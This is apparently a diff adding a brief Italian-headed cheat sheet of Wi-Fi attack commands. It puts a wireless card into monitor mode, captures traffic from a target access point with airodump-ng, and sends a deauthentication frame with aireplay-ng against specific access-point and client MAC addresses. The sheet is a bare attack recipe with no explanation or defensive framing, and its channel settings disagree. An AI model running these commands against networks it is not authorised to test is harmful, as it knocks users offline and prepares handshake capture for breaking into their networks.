@@ -1,0 +1,15 @@
+
+CONFIGURAZIONE SCHEDA DI RETE
+sudo airmon-ng check kill
+sudo ip link set wlan0 down
+sudo iwconfig wlan0 mode monitor
+sudo ip link set wlan0 up
+
+SET CANALE
+sudo iwconfig wlan0 channel 12
+
+MONITORING PACCHETTI
+sudo airodump-ng -c 6 --bssid  ::::    -w cattura_wireshark wlan0
+
+DEAUTH
+sudo aireplay-ng -0 1 -a   52:0D:43:C8:15:B6   -c 8C:85:80:95:DF:5A wlan0
